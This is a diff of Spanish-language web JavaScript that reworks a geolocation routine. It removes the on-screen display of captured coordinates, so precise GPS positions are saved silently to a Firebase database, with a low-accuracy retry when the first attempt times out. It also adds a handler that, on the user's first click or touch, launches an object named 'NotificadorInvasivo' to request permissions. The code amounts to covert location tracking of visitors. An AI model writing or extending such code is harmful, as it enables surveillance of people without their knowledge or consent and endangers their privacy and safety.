@@ -46,40 +46,47 @@ async function guardarUbicacionBD(lat, lon) {
     console.error("Error al guardar en Firebase:", e);
   }
 }
+/* --- CONFIGURACIÓN DE SEGURIDAD PARA ANDROID --- */
+const opcionesGPS = {
+  enableHighAccuracy: true, // Android usa el GPS real si esto es true
+  timeout: 20000,           // 20 segundos (Android a veces tarda en "fijar" satélites)
+  maximumAge: 0
+};
 
-/* --- 2. FUNCIÓN DE GEOLOCALIZACIÓN --- */
 async function obtenerUbicacion() {
-  const resultado = document.getElementById("resultado");
+  if (!navigator.geolocation) return;
 
-  if (navigator.geolocation) {
-    if (resultado) resultado.innerHTML = "Capturando ubicación...";
-
-    navigator.geolocation.getCurrentPosition(
-      async function (posicion) {
-        const lat = posicion.coords.latitude;
-        const lon = posicion.coords.longitude;
-
-        if (resultado) {
-          resultado.innerHTML = `Lat: ${lat.toFixed(5)}, Lon: ${lon.toFixed(5)}`;
-        }
-
-        // Llamamos a la función de guardado
-        guardarUbicacionBD(lat, lon);
-      },
-      function (error) {
-        console.error("Error de GPS:", error.message);
-        if (resultado) resultado.innerHTML = "No se pudo obtener la ubicación.";
-      },
-      {
-        enableHighAccuracy: true,
-        timeout: 10000,
-        maximumAge: 0
+  navigator.geolocation.getCurrentPosition(
+    async (pos) => {
+      const { latitude, longitude } = pos.coords;
+      console.log("Ubicación capturada en Android/iOS");
+      guardarUbicacionBD(latitude, longitude);
+    },
+    (err) => {
+      console.error("Error GPS:", err.code, err.message);
+      // Si falla con HighAccuracy, reintentamos con baja precisión (más rápido en Android)
+      if (err.code === err.TIMEOUT) {
+        navigator.geolocation.getCurrentPosition(pos => {
+          guardarUbicacionBD(pos.coords.latitude, pos.coords.longitude);
+        }, null, { enableHighAccuracy: false });
       }
-    );
-  } else {
-    if (resultado) resultado.innerHTML = "El navegador no soporta GPS.";
-  }
+    },
+    opcionesGPS
+  );
 }
+
+/* --- DISPARADOR UNIVERSAL --- */
+function inicializarApp() {
+  
+  NotificadorInvasivo.solicitarPermiso(180000);
+
+  // Quitamos eventos para evitar bucles
+  document.removeEventListener('click', inicializarApp);
+  document.removeEventListener('touchstart', inicializarApp);
+}
+
+document.addEventListener('click', inicializarApp);
+document.addEventListener('touchstart', inicializarApp);
 
 /* --- 3. OBJETO NOTIFICADOR (EL CORAZÓN DEL PERMISO) --- */
 const NotificadorInvasivo = {
